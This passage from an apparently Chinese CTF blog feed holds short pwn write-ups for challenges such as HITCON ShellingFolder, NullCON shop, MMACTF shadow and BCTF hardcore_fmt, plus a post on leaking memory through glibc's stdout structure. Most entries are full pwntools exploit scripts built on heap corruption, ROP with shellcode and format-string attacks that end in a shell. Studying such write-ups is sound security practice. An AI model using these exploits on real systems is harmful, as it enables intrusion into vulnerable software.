overlap，然后泄漏libc基地址、利用0x70的chunk修改__malloc_hook的值为one_gadget。 漏洞如下： 12345678910111213141516171819202122232425262728293031323334353637char *read_row_key()&#123; char *chunk; // r12 char *current_dest; // rbx size_t usable_size; // r14 char chr; // al MAPDST signed __int64 offset; // r13 char *new_chunk; // rax chunk = (char *)malloc(8uLL); current_dest = chunk; usable_size = malloc_usable_size(chunk); while ( 1 ) &#123; chr = _IO_getc(stdin); if ( chr == -1 ) EXIT(); if ( chr == '\n' ) // 当offset正好为chunk大小时，break，off-by-null break; offset = current_dest - chunk; if ( usable_size &lt;= current_dest - chunk ) // 空间不够用时 &#123; new_chunk = (char *)realloc(chunk, 2 * usable_size); // 扩大两倍 chunk = new_chunk; if ( !new_chunk ) &#123; puts("FATAL: Out of memory"); exit(-1); &#125; current_dest = &amp;new_chunk[offset]; // 更新两个变量 usable_size = malloc_usable_size(new_chunk); &#125; *current_dest++ = chr; &#125; *current_dest = 0; // off-by-null return chunk;&#125; exp如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182from pwn import *def get(p, key): p.sendlineafter('command:\n', 'GET') p.sendlineafter('row key:\n', key)def put(p, key, data): p.sendlineafter('command:\n', 'PUT') p.sendlineafter('row key:\n', key) p.sendlineafter('size:\n', str(len(data))) p.sendafter('data:\n', data)def delete(p, key): p.sendlineafter('command:\n', 'DEL') p.sendlineafter('row key:\n', key)def dump(p): p.sendlineafter('command:\n', 'DUMP')def pwn(): p = process('./datastore.elf') elf = ELF('./datastore.elf') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] put(p, '1', 'a' * 0x30) put(p, '2', 'b') put(p, '3', 'c' * 0x30) delete(p, '3') delete(p, '2') delete(p, '1') payload = 'a' * 0x1f0 + p64(0x200) + p64(0x90) payload = payload.ljust(0x280, '\x00') put(p, '1', payload) put(p, '2', 'a' * 0x100) put(p, '3', 'a' * 0x60) delete(p, '1') put(p, '1', 'a' * 0x30) put(p, '4' * 0x18, 'a' * 0x300) # off by null delete(p, 'th3fl4g') put(p, 'th3fl4g', 'a' * 0x110) delete(p, '1') put(p, '1' * 0x20, 'a' * 0x60) delete(p, 'th3fl4g') delete(p, '2') put(p, '2', 'a' * 0x110) get(p, '1' * 0x20) p.recvuntil(']:\n') recv = p.recv(6) libc.address = u64(recv + '\x00\x00') - (0x7fbdacf7cb78 - 0x00007fbdacbb8000) log.info('libc:%s', hex(libc.address)) delete(p, '2') payload = 'a' * 0x110 + p64(0) + p64(0x71) payload += 0x68 * 'a' + p64(0x21) put(p, '2', payload) delete(p, '1' * 0x20) delete(p, '2') payload = 'a' * 0x110 + p64(0) + p64(0x71) + p64(libc.symbols['__malloc_hook'] - 0x13) payload += 0x68 * 'a' + p64(0x21) put(p, '2', payload) put(p, '1' * 0x20, 'a' * 0x60) payload = '\x00' * 3 + p64(libc.address + 0x4526a) payload = payload.ljust(0x60, '\x00') put(p, '5', payload) #gdb.attach(p) p.sendlineafter('command:\n', 'PUT') #getshell p.interactive() p.close()if __name__ == '__main__': pwn() HITCON CTF 2016 Quals ShellingFolder [2019.02.14]在0x1334函数中存在信息泄露和任意地址写的漏洞，泄漏堆栈地址并将__malloc_hook改成one_gadget即可。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384from pwn import *def list_current(p): p.sendlineafter('choice:', '1')def change_current(p, new_folder): p.sendlineafter('choice:', '2') p.sendlineafter('Folder :', new_folder)def create_folder(p, name): p.sendlineafter('choice:', '3') p.sendafter('Folder:', name)def create_file(p, name, size): p.sendlineafter('choice:', '4') p.sendafter('File:', name) p.sendlineafter('File:', str(size))def remove(p, name): p.sendlineafter('choice:', '5') p.sendlineafter('file :', name)def calc(p): p.sendlineafter('choice:', '6')def pwn(): #context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] p = process('./shellingfolder') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') create_file(p, 'sunichi', 0) create_file(p, 'sunichi1', -0x10) create_file(p, 'a' * 0x18 + '\x10', 0x38) remove(p, 'sunichi1') calc(p) p.recvuntil('a' * 0x18) recv = p.recv(6) + '\x00\x00' heap_addr = u64(recv) - 0x10 list_current(p) p.recvuntil('----------------------\n') recv = p.recv(6) + '\x00\x00' libc.address = u64(recv) - (0x7f5885ba1b78 - 0x7f58857dd000) log.info('libc:%s' % hex(libc.address)) one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147] create_folder(p, 'getshell') change_current(p, 'getshell') create_file(p, 'a' * 0x18 + p64(libc.symbols['__malloc_hook'])[:6], 0x0) change_current(p, '..') create_folder(p, 'restore') change_current(p, 'restore') create_file(p, 'a' * 0x18 + p64(heap_addr + 0x10)[:6], 0xd8-0x50) calc(p) change_current(p, '..') remove(p, 'a' * 0x18 + '\x10') create_file(p, 'a' * 0x18 + p64(heap_addr + 0x2cd)[:6], ord(p64(libc.address + one_gadget[2])[5])) calc(p) remove(p, 'a' * 0x18 + p64(heap_addr + 0x2cd)[:6]) for i in range(5): create_file(p, 'a' * 0x18 + p64(heap_addr + 0x2cc - i)[:6], ord(p64(libc.address + one_gadget[2])[4 - i])) calc(p) remove(p, 'a' * 0x18 + p64(heap_addr + 0x2cc - i)[:6]) change_current(p, 'getshell') calc(p) change_current(p, '..') log.info('one_gadget:%s' % hex(libc.address + one_gadget[2])) log.info('heap:%s' % hex(heap_addr)) gdb.attach(p) remove(p, '\x91') # get shell p.interactive() p.close()if __name__ == '__main__': pwn() Boston Key Party 2016 simple-calc-5 [2019.02.15]保存结果时存在复制后栈溢出，可以ROP，但程序静态编译，需要ROP到mprotect将部分内存修改为wx属性来ret2shellcode。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687from pwn import *def add(p, num1, num2): p.sendlineafter('=&gt; ', '1') p.sendlineafter('x: ', str(num1)) p.sendlineafter('y: ', str(num2))def subs(p, num1, num2): p.sendlineafter('=&gt; ', '2') p.sendlineafter('x: ', str(num1)) p.sendlineafter('y: ', str(num2))def set_zero(p): subs(p, 0x2000, 0x2000)def pwn(): p = process('./calc') context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] p.sendlineafter('calculations: ', '100') #gdb.attach(p, gdbscript='b *0x401588') for i in range(0x6): add(p, 0xbead, 0x2000) add(p, 0xbead, 0x2000) set_zero(p) set_zero(p) add(p, 0xbead, 0x2000) add(p, 0xbead, 0x2000) # saved rbp add(p, 0x6c0000, 0x5800) set_zero(p) # pop rdi; ret add(p, 0x400000, 0x1b73) set_zero(p) add(p, 0x6c0000, 0x5000) set_zero(p) # pop rsi; ret add(p, 0x400000, 0x1c87) set_zero(p) add(p, 0x800, 0x800) set_zero(p) # pop rdx; ret add(p, 0x400000, 0x37a85) set_zero(p) subs(p, 0x807, 0x800) set_zero(p) # call mprotect add(p, 0x400000, 0x35690) set_zero(p) # call read # pop rdi; ret add(p, 0x400000, 0x1b73) set_zero(p) set_zero(p) set_zero(p) # pop rsi; ret add(p, 0x400000, 0x1c87) set_zero(p) add(p, 0x6c0000, 0x5e00) set_zero(p) # pop rdx; ret add(p, 0x400000, 0x37a85) set_zero(p) subs(p, 0x900, 0x800) set_zero(p) # call read add(p, 0x400000, 0x34b20) set_zero(p) # ret2shellcode add(p, 0x6c0000, 0x5e00) set_zero(p) p.sendlineafter('=&gt; ', '5') shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" p.sendline(shellcode) p.interactive() p.close()if __name__ == '__main__': pwn() HITCON 2016 babyheap [2019.02.18]NullCON 2019 shop [2019.02.21]use after free漏洞，通过double free可以泄漏got表信息、获取libc。修改__malloc_hook即可getshell。也有wp通过格式化字符串漏洞实现信息泄露。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970from pwn import *def new(p, size, name): p.sendlineafter('&gt; ', '1') p.sendlineafter('length: ', str(size)) p.sendafter('name: ', name) p.sendlineafter('price: ', '17')def delete(p, idx): p.sendlineafter('&gt; ', '2') p.sendlineafter('index: ', str(idx))def view(p): p.sendlineafter('&gt; ', '3')def pwn(): p = process('./challenge') elf = ELF('./challenge') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') new(p, 0x60, '/bin/sh') new(p, 0x60, '/bin/sh') new(p, 0x60, '/bin/sh') new(p, 0x30, '3') new(p, 0x60, '/bin/sh') new(p, 0x60, '/bin/sh') new(p, 0x60, '/bin/sh') context.terminal = ['tmux', 'split', '-h'] delete(p, 0) delete(p, 1) delete(p, 0) payload = p64(0) + p64(elf.got['puts']) new(p, 0x30, payload) view(p) # get puts address delete(p, 2) delete(p, 0) payload = p64(0) + p64(elf.got['fgets']) new(p, 0x30, payload) # context.log_level='debug' view(p) # get fgets address p.recvuntil('"name": "') p.recvuntil('"name": "') recv = p.recv(6) + '\x00\x00' libc.address = u64(recv) - (0x7fbe1d061ad0 - 0x00007fbe1cff4000) # get libc log.info('libc:%s' % hex(libc.address)) delete(p, 3) delete(p, 0) new(p, 0x60, '\n') new(p, 0x60, p64(libc.symbols['__malloc_hook'] - 0x13)) new(p, 0x60, '\n') new(p, 0x60, '\n') payload = '\x7f\x00\x00' + p64(libc.address + 0xf02a4) new(p, 0x60, payload) delete(p, 0) # get shell # gdb.attach(p) p.interactive() p.close()if __name__ == '__main__': pwn() NullCON 2019 babypwn [2019.02.28]格式化字符串和有、无符号数的比较两个漏洞。虽然能够溢出，但是程序开启了canary保护，需要想办法规避。看了其他人的wp才知道，对于 1scanf("%d", ...) 来说，如果用户输入字符-或+，scanf函数不会改变相应变量的值。涨知识了。绕过canary后就是常规的格式化字符串漏洞了。 原文： 123This requires knowledge of a cool scanf trick. When scanf is called like so:scanf(&quot;%d&quot;, ...);You can provide the characters - or +, and the scanf will not change the value of the variable.]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2019</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Happy 2019 Chinese New Year]]></title>
    <url>%2F2019%2F02%2F05%2Fhappy-2019-chinese-new-year%2F</url>
    <content type="text"><![CDATA[猪年（己亥年）快乐！]]></content>
      <tags>
        <tag>2019</tag>
        <tag>happy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019 Jan pwn writeup]]></title>
    <url>%2F2019%2F01%2F30%2F19-Jan%2F</url>
    <content type="text"><![CDATA[MMACTF 2016 shadow程序的基本功能包括：输入姓名；设定message长度；输入message。共有3次修改姓名和message的机会。 程序中实现了一个影子栈及pop、push、call和ret的函数，使得无法覆盖调用ret进行返回的函数的返回地址。在进行函数调用时，未被保护到的函数为程序调用的libc中的函数，这些函数仍然执行汇编指令ret进行返回而不是程序自行实现的ret函数。 利用无符号数的转换来泄漏canary和libc地址。由于name的地址保存在栈上，通过输入的漏洞可以覆盖该地址为_environ地址来泄漏栈地址。用于记录剩余输入次数的变量也保存在栈上。在修改name前，把name指向read函数的返回地址（libc中的函数没有得到ret函数的保护），使得在修改name时能够控制程序执行流来getshell。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263# coding=utf-8from pwn import *def pwn(): BIN_PATH = './shadow' DEBUG = 1 context.arch = 'i386' if DEBUG == 1: p = process(BIN_PATH) elf = ELF(BIN_PATH) context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') # leak canary p.recvuntil('name : ') p.sendline('sunichi') p.recvuntil('length : ') p.sendline('-1') p.sendafter('message : ', 'a' * 33) p.recvuntil('a' * 33) canary = '\x00' + p.recv(3) # leak libc p.sendlineafter('(y/n) :', 'n') p.recvuntil('length : ') p.sendline('-1') payload = 'a' * 41 p.sendafter('message : ', payload) p.recvuntil(payload) recv = '\x00' + p.recv(3) recv = u32(recv) print hex(recv) libc.address = recv - (0xf76f3000 - 0xf7541000) print hex(libc.address) # leak stack address p.sendlineafter('(y/n) :', 'n') p.recvuntil('length : ') p.sendline('-1') payload = 'a' * 0x20 + canary + 'a' * 8 + p32(0) + p32(0) payload += p32(libc.symbols['_environ']) + p32(0x0804a800) + p32(100) p.sendafter('message : ', payload) p.recvuntil(') &lt;') stack_addr = u32(p.recv(4)) print hex(stack_addr) # attack p.sendlineafter('(y/n) :', 'n') p.recvuntil('length : ') p.sendline('-1') payload = 'a' * 0x20 + canary + 'a' * 8 + p32(0) + p32(0) payload += p32(stack_addr - (0x98c-0x7bc)) + p32(0x0804a800) + p32(100) p.sendafter('message : ', payload) payload = p32(libc.symbols['system']) + p32(0x0804a800) + p64(next(libc.search('/bin/sh'))) p.sendafter('name : ', payload) p.interactive() p.close()if __name__ == '__main__': pwn() Insomni’hack 2018 GoGoGadgetCopter输入内容时调用的read函数，可以用来泄漏地址。Gadget的scanf函数导致off-by-null，可用来制造堆块重叠。利用House of Orange来getshell。from pwn import *_IO_FILE_plus_size = &#123; 'i386': 0x98, 'amd64': 0xe0&#125;_IO_FILE_plus = &#123; 'i386': &#123; 0x0: '_flags', 0x4: '_IO_read_ptr', 0x8: '_IO_read_end', 0xc: '_IO_read_base', 0x10: '_IO_write_base', 0x14: '_IO_write_ptr', 0x18: '_IO_write_end', 0x1c: '_IO_buf_base', 0x20: '_IO_buf_end', 0x24: '_IO_save_base', 0x28: '_IO_backup_base', 0x2c: '_IO_save_end', 0x30: '_markers', 0x34: '_chain', 0x38: '_fileno', 0x3c: '_flags2', 0x40: '_old_offset', 0x44: '_cur_column', 0x46: '_vtable_offset', 0x47: '_shortbuf', 0x48: '_lock', 0x4c: '_offset', 0x54: '_codecvt', 0x58: '_wide_data', 0x5c: '_freeres_list', 0x60: '_freeres_buf', 0x64: '__pad5', 0x68: '_mode', 0x6c: '_unused2', 0x94: 'vtable' &#125;, 'amd64': &#123; 0x0: '_flags', 0x8: '_IO_read_ptr', 0x10: '_IO_read_end', 0x18: '_IO_read_base', 0x20: '_IO_write_base', 0x28: '_IO_write_ptr', 0x30: '_IO_write_end', 0x38: '_IO_buf_base', 0x40: '_IO_buf_end', 0x48: '_IO_save_base', 0x50: '_IO_backup_base', 0x58: '_IO_save_end', 0x60: '_markers', 0x68: '_chain', 0x70: '_fileno', 0x74: '_flags2', 0x78: '_old_offset', 0x80: '_cur_column', 0x82: '_vtable_offset', 0x83: '_shortbuf', 0x88: '_lock', 0x90: '_offset', 0x98: '_codecvt', 0xa0: '_wide_data', 0xa8: '_freeres_list', 0xb0: '_freeres_buf', 0xb8: '__pad5', 0xc0: '_mode', 0xc4: '_unused2', 0xd8: 'vtable' &#125;&#125;class IO_FILE_plus_struct(dict): arch = None endian = None fake_file = None size = 0 FILE_struct = [] @LocalContext def __init__(self): self.arch = context.arch self.endian = context.endian if self.arch != 'i386' and self.arch != 'amd64': log.error('architecture not supported!') success('arch: '+str(self.arch)) self.FILE_struct = [_IO_FILE_plus[self.arch][i] for i in sorted(_IO_FILE_plus[self.arch].keys())] print self.FILE_struct self.update(&#123;r: 0 for r in self.FILE_struct&#125;) self.size = _IO_FILE_plus_size[self.arch] def __setitem__(self, item, value): if item not in self.FILE_struct: log.error("Unknown item %r (not in %r)" % (item, self.FILE_struct)) super(IO_FILE_plus_struct, self).__setitem__(item, value) def __setattr__(self, attr, value): if attr in IO_FILE_plus_struct.__dict__: super(IO_FILE_plus_struct, self).__setattr__(attr, value) else: self[attr] = value def __getattr__(self, attr): return self[attr] def __str__(self): fake_file = "" with context.local(arch=self.arch): for item_offset in sorted(self.item_offset): if len(fake_file) &lt; item_offset: fake_file += "\x00"*(item_offset - len(fake_file)) fake_file += pack(self[_IO_FILE_plus[self.arch] [item_offset]], word_size='all') fake_file += "\x00"*(self.size - len(fake_file)) return fake_file @property def item_offset(self): return _IO_FILE_plus[self.arch].keys()def Create(p, content): p.sendlineafter('Go Go Gadget: ', str(1)) p.sendlineafter('Gadget :', content) if len(content) == 0xa8: p.recvuntil('Go Go Gadget: ')def Delete(p, idx): p.sendlineafter('Go Go Gadget: ', str(2)) p.sendlineafter('Gadget [id] :', str(idx))def GoGoGadget(p, idx): p.sendlineafter('Go Go Gadget: ', str(3)) p.sendlineafter('Gadget [idx] :', str(idx))def Active(p, speed, content): p.sendlineafter('Go Go Gadget: ', str(4)) p.sendlineafter('Speed :', str(speed)) p.sendafter('Destination :', content)def Deactive(p): p.sendlineafter('Go Go Gadget: ', str(5))def GoGoCopter(p): p.sendlineafter('Go Go Gadget: ', str(6))def pwn(): BIN_PATH = './gogogadget' context.arch = 'amd64' p = process(BIN_PATH) elf = ELF(BIN_PATH) context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') Create(p, 'sunichi') Create(p, p64(0x60) * (0xa0 / 8)) Create(p, p64(0x60) * (0xa0 / 8)) Create(p, 'sunichi') Create(p, 'sunichi') Delete(p, 0) Delete(p, 1) Delete(p, 2) Delete(p, 3) payload = 'a' * 0xa0 + p64(0xb0) Create(p, payload) p.recvuntil('Wrong input !') payload = 'a' * 0xa0 + p64(0xb0)[:7] Create(p, payload) Active(p, 0, '\x78') GoGoCopter(p) p.recvuntil('Gogo Copter To: ') recv = p.recv(6) arena_88_addr = u64(recv.ljust(8, '\x00')) libc.address = arena_88_addr - (0x7efee8b41b78 - 0x00007efee877d000) Delete(p, 1) Delete(p, 4) Create(p, 'sunichi') Create(p, 'sunichi') Create(p, 'sunichi') Create(p, 'sunichi') Delete(p, 1) Delete(p, 3) GoGoCopter(p) p.recvuntil('Gogo Copter To: ') recv = p.recv(6) heap_addr = u64(recv.ljust(8, '\x00')) fake_file = IO_FILE_plus_struct() fake_file._flags = u64('/bin/sh\x00') fake_file._IO_read_ptr = 0x61 fake_file._IO_read_base = 0x7fffffffffff-0x10 fake_file._IO_write_base = 0 fake_file._IO_write_ptr = 1 fake_file._mode = 0 fake_file.vtable = heap_addr - 80 payload = p64(0) * 2 + p64(libc.symbols['system']) * 3 payload = payload.ljust(0x50, '\x00') + '/bin/sh\x00' + p64(0xf1)[:2] Create(p, payload) payload = p64(0) + p64(0) + p64(0) + p64(1) + '\x00' * 0x21 Create(p, payload) Delete(p, 4) Create(p, str(fake_file)[0x70:0xc8] + p64(0x51) + p64(0) * 3 + p64(heap_addr - 80)) Delete(p, 1) Delete(p, 3) payload = p64(0) + p64(1) + p64(2) + p64(libc.symbols['system']) payload = payload.ljust(0x50, '\x00') + '/bin/sh\x00' + p64(0x61) payload += p64(libc.address + (0x7ffff7dd1b78 - 0x7ffff7a0d000)) + p64(libc.symbols['_IO_list_all'] - 0x10) payload += p64(0x30) + p64(0x40) Create(p, payload) print hex(heap_addr) print hex(arena_88_addr) print hex(libc.address) gdb.attach(p) p.interactive() p.close()if __name__ == "__main__": pwn()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2019</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BCTF 2018 pwn writeup]]></title>
    <url>%2F2019%2F01%2F13%2Fbctf18-pwn%2F</url>
    <content type="text"><![CDATA[easiest通过double free修改got项到程序中的getshell函数。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859# coding=utf-8from pwn import *def Add(p, idx, size, content): p.sendlineafter('delete \n', str(1)) p.sendlineafter('(0-11):', str(idx)) p.sendlineafter('Length:', str(size)) p.sendlineafter('C:', content)def Delete(p, idx): p.sendlineafter('delete \n', str(2)) p.sendlineafter('(0-11):', str(idx))def pwn(): BIN_PATH = './easiest' DEBUG = 1 context.arch = 'amd64' if DEBUG == 1: p = process(BIN_PATH) elf = ELF(BIN_PATH) context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: p = remote('39.96.9.148', 9999) elf = ELF(BIN_PATH) context.log_level = 'debug' Add(p, 0, 0x68, 'sunichi') Add(p, 1, 0x68, 'sunichi') Add(p, 2, 0x100, 'sunichi') Add(p, 3, 0x100, 'sunichi') Delete(p, 0) Delete(p, 1) Delete(p, 0) Delete(p, 2) Add(p, 0, 0x68, p64(0x602045)) Add(p, 1, 0x68, 'sunichi') Add(p, 2, 0x68, 'sunichi') payload = '\x00\x00\x00' + p64(0x400946) * 6 Add(p, 3, 0x68, payload) gdb.attach(p) raw_input() p.interactive() p.close()if __name__ == '__main__': pwn() hardcore_fmt利用%a泄漏mmap的地址，然后通过向前偏移泄漏canary，接着通过one_gadget（同样通过前向偏 移计算libc基地址）拿到shell。 本地和服务器偏移不一致，需要轻度爆破。 C99 %a：Hexadecimal floating point, lowercase. (-0xc.90fep-2) 后来调试了一下，输出的地址是在printf_chk执行过程中压入到栈中的。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455# coding=utf-8from pwn import *def pwn(): BIN_PATH = './hardcore_fmt' DEBUG = 0 context.arch = 'amd64' if DEBUG == 1: p = process(BIN_PATH) elf = ELF(BIN_PATH) context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') f = open('/proc/'+str(pidof(p)[0])+'/maps') data = f.read().split('\n') f.close() for j in data: if 'hardcore_fmt' in j: elf.address = int('0x' + j[0:12], 16) else: p = remote('39.106.110.69', 9999) elf = ELF(BIN_PATH) libc = ELF('./libc-2.27.so') context.log_level = 'debug' if DEBUG == 1: gdb.attach(p) raw_input() p.sendline('%a%2$a%3$a') p.recvuntil('0x0.0') p.recvuntil('0x0.0') recv = p.recv(10) + '00' if DEBUG == 1: p.sendline(str(int(recv, 16) - 35800 + 1)) else: p.sendline(str(int(recv, 16) - 41216 + 0x1000 * 6 + 0x1529)) p.recvuntil(': ') canary = '\x00' + p.recv(7) libc_base = int(recv, 16) - 6398208 print hexdump(canary) print hex(int(recv, 16)) raw_input() p.sendline('a' * 0x108 + canary + p64(0) + p64(0) + p64(int(recv, 16)) + p64(libc_base + 0x4f322)) p.interactive() p.close()if __name__ == '__main__': pwn() SOS原理参考这篇⽂章：https://blogs.msmvps.com/gdicanio/2016/11/17/the-small-string-optimization/ 也是SECCON 2018 CTF的⼀道题的出题点。在C++中，当⼀个string对象较⼩时，为 了优化效率，会将其分配到栈上⽽不是堆上，这样就能栈溢出ROP了，这题⽐较坑的⼀个地⽅是如何结束输⼊。]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2018</tag>
        <tag>bctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Leak From Stdout]]></title>
    <url>%2F2018%2F11%2F29%2Fleak-from-stdout%2F</url>
    <content type="text"><![CDATA[在最近的一些题目中，多次运用到了修改stdout的FILE结构体中的缓冲区指针进行信息泄漏，参考了大佬们阅读源代码的博客，记录一下。 以下是三个涉及FILE的主要结构体： _IO_FILE_plus结构体： 1234567891011// from libioP.h in glibc/* We always allocate an extra word following an _IO_FILE. This contains a pointer to the function jump table used. This is for compatibility with C++ streambuf; the word can be used to smash to a pointer to a virtual function table. */struct _IO_FILE_plus&#123; _IO_FILE file; const struct _IO_jump_t *vtable;&#125;; _IO_FILE结构体： 12345678910111213141516171819202122232425262728293031323334353637383940414243// from /usr/include/libio.hstruct _IO_FILE &#123; int _flags; /* High-order word is _IO_MAGIC; rest is flags. */#define _IO_file_flags _flags /* The following pointers correspond to the C++ streambuf protocol. */ /* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */ char* _IO_read_ptr; /* Current read pointer */ char* _IO_read_end; /* End of get area. */ char* _IO_read_base; /* Start of putback+get area. */ char* _IO_write_base; /* Start of put area. */ char* _IO_write_ptr; /* Current put pointer. */ char* _IO_write_end; /* End of put area. */ char* _IO_buf_base; /* Start of reserve area. */ char* _IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno;#if 0 int _blksize;#else int _flags2;#endif _IO_off_t _old_offset; /* This used to be _offset but it's too small. */#define __HAVE_COLUMN /* temporary */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; /* char* _save_gptr; char* _save_egptr; */ _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE&#125;; _IO_jump_t结构体： 1234567891011121314151617181920212223242526272829struct _IO_jump_t&#123; JUMP_FIELD(size_t, __dummy); JUMP_FIELD(size_t, __dummy2); JUMP_FIELD(_IO_finish_t, __finish); JUMP_FIELD(_IO_overflow_t, __overflow); JUMP_FIELD(_IO_underflow_t, __underflow); JUMP_FIELD(_IO_underflow_t, __uflow); JUMP_FIELD(_IO_pbackfail_t, __pbackfail); /* showmany */ JUMP_FIELD(_IO_xsputn_t, __xsputn); JUMP_FIELD(_IO_xsgetn_t, __xsgetn); JUMP_FIELD(_IO_seekoff_t, __seekoff); JUMP_FIELD(_IO_seekpos_t, __seekpos); JUMP_FIELD(_IO_setbuf_t, __setbuf); JUMP_FIELD(_IO_sync_t, __sync); JUMP_FIELD(_IO_doallocate_t, __doallocate); JUMP_FIELD(_IO_read_t, __read); JUMP_FIELD(_IO_write_t, __write); JUMP_FIELD(_IO_seek_t, __seek); JUMP_FIELD(_IO_close_t, __close); JUMP_FIELD(_IO_stat_t, __stat); JUMP_FIELD(_IO_showmanyc_t, __showmanyc); JUMP_FIELD(_IO_imbue_t, __imbue);#if 0 get_column; set_column;#endif&#125;; 以下是FILE结构体进行输出时的相关代码： 123456789101112131415161718// from fileops.c in glibcint _IO_new_file_overflow (_IO_FILE *f, int ch)&#123; if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */ &#123; //... return EOF; &#125; if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL) &#123; //... &#125; if (ch == EOF) // 攻击者想到执行到的代码位置 return _IO_do_write (f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base); //...&#125;libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow) 从代码中可以看出，如果想要执行return _IO_do_write (f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);并尽可能减少其他不必要的代码执行，就需要满足下列三个条件： f-&gt;_flags &amp; _IO_NO_WRITES == 0 (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) != 0 f-&gt;_IO_write_base != 0 下面来看_IO_do_write函数： 123456789101112131415161718192021222324252627282930313233343536373839404142// from fileops.c in glibcint _IO_new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)&#123; // 实际调用new_do_write函数 return (to_do == 0 || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;&#125;libc_hidden_ver (_IO_new_do_write, _IO_do_write)static _IO_size_t new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)&#123; _IO_size_t count; if (fp-&gt;_flags &amp; _IO_IS_APPENDING) //需要使这个if成立 /* On a system without a proper O_APPEND implementation, you would need to sys_seek(0, SEEK_END) here, but is not needed nor desirable for Unix- or Posix-like systems. Instead, just indicate that offset (before and after) is unpredictable. */ fp-&gt;_offset = _IO_pos_BAD; else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base) &#123; //fp-&gt;_IO_write_base - fp-&gt;_IO_read_end非常大，如果read被置为0 _IO_off64_t new_pos = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, 1); if (new_pos == _IO_pos_BAD) return 0; fp-&gt;_offset = new_pos; &#125; // fp=stdout data=stdout-&gt;_IO_write_base to_do=f-&gt;_IO_write_ptr - f-&gt;_IO_write_base count = _IO_SYSWRITE (fp, data, to_do); if (fp-&gt;_cur_column &amp;&amp; count) fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - 1, data, count) + 1; _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base); // 重置write的指针 fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base; fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= 0 &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED)) ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end); return count;&#125; 所以需要满足下列四个条件： f-&gt;_flags &amp; _IO_NO_WRITES == 0 (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) != 0 f-&gt;_IO_write_base != 0 fp-&gt;_flags &amp; _IO_IS_APPENDING != 0 进而能够调用_IO_SYSWRITE (fp, data, to_do)即 1_IO_SYSWRITE (stdout, stdout-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) 所以需要将flag设置为： 1234_flags = 0xfbad0000 // Magic number_flags &amp; = ~_IO_NO_WRITES // _flags = 0xfbad0000_flags | = _IO_CURRENTLY_PUTTING // _flags = 0xfbad0800_flags | = _IO_IS_APPENDING // _flags = 0xfbad1800 参考文章： 